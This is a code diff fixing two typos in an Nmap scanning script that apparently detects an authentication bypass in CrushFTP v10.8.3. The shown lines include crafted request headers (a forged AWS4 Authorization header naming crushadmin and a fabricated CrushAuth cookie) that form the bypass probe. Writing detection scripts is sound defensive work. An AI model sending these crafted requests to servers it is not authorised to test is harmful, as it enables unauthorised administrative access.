@@ -1,7 +1,7 @@
 local shortport = require "shortport"
 local http = require "http"
 local stdnse = require "stdnse"
-math.random(os.time())
+math.randomseed(os.time())
 description = [[
   This script is intended to detect the authentication bypass vulnerability in CrushFTP v10.8.3 by sending crafted HTTP requests and analying the response to determine if the server can be accessed without valid credentials.
 ]]
@@ -55,7 +55,7 @@ action = function(host, port)
    local headers = {
 	   ["Authorization"] = "AWS4-HMAC-SHA256 Credential=crushadmin/",
 	   ["Cookie"] = ("CrushAuth=%s_%s%s; currentAuth=%s"):format(ts13, rand, c2f, c2f),
-	   ["X-Requested-With"] = "XMLHttpRequet",
+	   ["X-Requested-With"] = "XMLHttpRequest",
    }
    -- 4.  Send request
    local response = http.get(host, port, path, { header = headers })
